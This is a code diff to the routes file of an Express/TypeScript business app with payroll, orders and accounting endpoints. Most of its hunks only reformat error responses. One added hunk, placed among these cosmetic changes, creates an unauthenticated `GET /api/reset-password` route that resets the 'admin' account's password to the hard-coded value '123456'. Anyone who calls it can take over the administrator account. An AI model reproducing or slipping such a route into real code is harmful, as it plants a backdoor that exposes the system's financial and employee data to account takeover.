@@ -30,6 +30,7 @@ import {
   insertPayrollRunSchema,
   insertEmployeeAdvanceSchema,
   insertEmployeeDeductionSchema,
+  users,
 } from "@shared/schema";
 import {
   formatZodError,
@@ -152,6 +153,19 @@ export async function registerRoutes(
     });
     const { password: _, ...safeUser } = user;
     res.json({ token, user: safeUser });
+  });
+
+  app.get("/api/reset-password", async (_req, res) => {
+    const bcrypt = await import("bcryptjs");
+
+    const hash = await bcrypt.hash("123456", 10);
+
+    await db
+      .update(users)
+      .set({ password: hash })
+      .where(eq(users.username, "admin"));
+
+    res.json({ success: true });
   });
 
   app.post("/api/auth/logout", (_req, res) => {
@@ -301,11 +315,9 @@ export async function registerRoutes(
           .json({ message: "كلمة المرور القديمة والجديدة مطلوبتان" });
       }
       if (newPassword.length < 6) {
-        return res
-          .status(400)
-          .json({
-            message: "كلمة المرور الجديدة يجب أن تكون 6 أحرف على الأقل",
-          });
+        return res.status(400).json({
+          message: "كلمة المرور الجديدة يجب أن تكون 6 أحرف على الأقل",
+        });
       }
       const user = await storage.getUser(req.jwtUser!.userId);
       if (!user) return res.status(404).json({ message: "المستخدم غير موجود" });
@@ -1594,11 +1606,9 @@ export async function registerRoutes(
         const already = Number(existingRes.rows[0]?.already || 0);
 
         if (already + qty > available) {
-          return res
-            .status(400)
-            .json({
-              message: `الكمية غير كافية. المتوفر: ${available}, المطلوب سابقاً: ${already}`,
-            });
+          return res.status(400).json({
+            message: `الكمية غير كافية. المتوفر: ${available}, المطلوب سابقاً: ${already}`,
+          });
         }
 
         const line = await storage.addStockTransferLine({
@@ -1954,11 +1964,9 @@ export async function registerRoutes(
         }
         for (const it of items) {
           if (!it.product_id || !it.qty || it.qty <= 0) {
-            return res
-              .status(400)
-              .json({
-                message: "كل صنف يجب أن يحتوي على product_id و qty > 0",
-              });
+            return res.status(400).json({
+              message: "كل صنف يجب أن يحتوي على product_id و qty > 0",
+            });
           }
         }
         const mapped = items.map((it: any) => ({
@@ -2294,11 +2302,9 @@ export async function registerRoutes(
     for (let i = 0; i < (items as any[]).length; i++) {
       const itemParsed = orderItemSchema.safeParse((items as any[])[i]);
       if (!itemParsed.success) {
-        return res
-          .status(400)
-          .json({
-            message: `بند ${i + 1}: ${formatZodError(itemParsed.error)}`,
-          });
+        return res.status(400).json({
+          message: `بند ${i + 1}: ${formatZodError(itemParsed.error)}`,
+        });
       }
     }
     try {
@@ -2377,11 +2383,9 @@ export async function registerRoutes(
       for (let i = 0; i < (items as any[]).length; i++) {
         const itemParsed = orderItemSchema.safeParse((items as any[])[i]);
         if (!itemParsed.success) {
-          return res
-            .status(400)
-            .json({
-              message: `بند ${i + 1}: ${formatZodError(itemParsed.error)}`,
-            });
+          return res.status(400).json({
+            message: `بند ${i + 1}: ${formatZodError(itemParsed.error)}`,
+          });
         }
       }
       const branchId = (parsed.data as any).branchId;
@@ -2474,11 +2478,9 @@ export async function registerRoutes(
   app.post("/api/orders/:id/pay", requireAuth, async (req, res) => {
     const { paymentMethod, bankTxnId } = req.body;
     if (!paymentMethod || !PAYMENT_METHODS.includes(paymentMethod)) {
-      return res
-        .status(400)
-        .json({
-          message: "طريقة الدفع غير صالحة. الخيارات: cash, card, bank_transfer",
-        });
+      return res.status(400).json({
+        message: "طريقة الدفع غير صالحة. الخيارات: cash, card, bank_transfer",
+      });
     }
     const row = await storage.payOrder(
       Number(req.params.id),
@@ -2709,11 +2711,9 @@ export async function registerRoutes(
         }
         const expenseSource = source || "cash";
         if (!["cash", "card", "bank_transfer"].includes(expenseSource)) {
-          return res
-            .status(400)
-            .json({
-              message: "مصدر غير صالح. الخيارات: cash, card, bank_transfer",
-            });
+          return res.status(400).json({
+            message: "مصدر غير صالح. الخيارات: cash, card, bank_transfer",
+          });
         }
 
         const user = await storage.getUser(req.jwtUser!.userId);
@@ -2869,12 +2869,10 @@ export async function registerRoutes(
       user.terminalName,
     );
     if (existing) {
-      return res
-        .status(409)
-        .json({
-          message: "يوجد شفت مفتوح بالفعل لهذا الجهاز",
-          shift: existing,
-        });
+      return res.status(409).json({
+        message: "يوجد شفت مفتوح بالفعل لهذا الجهاز",
+        shift: existing,
+      });
     }
     const { openingCash } = req.body;
     const shiftData = {
@@ -4338,12 +4336,10 @@ export async function registerRoutes(
           [String(month), Number(year)],
         );
         if (existing.rows.length > 0) {
-          return res
-            .status(400)
-            .json({
-              message: "يوجد كشف رواتب لهذا الشهر مسبقاً",
-              existingId: existing.rows[0].id,
-            });
+          return res.status(400).json({
+            message: "يوجد كشف رواتب لهذا الشهر مسبقاً",
+            existingId: existing.rows[0].id,
+          });
         }
         const run = await storage.createPayrollRun({
           month: String(month),
@@ -4846,11 +4842,9 @@ export async function registerRoutes(
             .status(400)
             .json({ message: "المبلغ يجب أن يكون أكبر من صفر" });
         if (alreadyPaid + payAmount > netSalary + 0.001) {
-          return res
-            .status(400)
-            .json({
-              message: `المبلغ يتجاوز المتبقي. المتبقي: ${(netSalary - alreadyPaid).toFixed(3)}`,
-            });
+          return res.status(400).json({
+            message: `المبلغ يتجاوز المتبقي. المتبقي: ${(netSalary - alreadyPaid).toFixed(3)}`,
+          });
         }
 
         const allowedMethods = ["cash", "bank_transfer", "cheque", "wallet"];
@@ -5257,11 +5251,9 @@ export async function registerRoutes(
         const { date, description, sourceType, sourceId, branchId, lines } =
           req.body;
         if (!date || !description || !lines || lines.length < 2) {
-          return res
-            .status(400)
-            .json({
-              message: "القيد يجب أن يحتوي على تاريخ ووصف وسطرين على الأقل",
-            });
+          return res.status(400).json({
+            message: "القيد يجب أن يحتوي على تاريخ ووصف وسطرين على الأقل",
+          });
         }
         const totalDebit = lines.reduce(
           (s: number, l: any) => s + parseFloat(l.debit || 0),
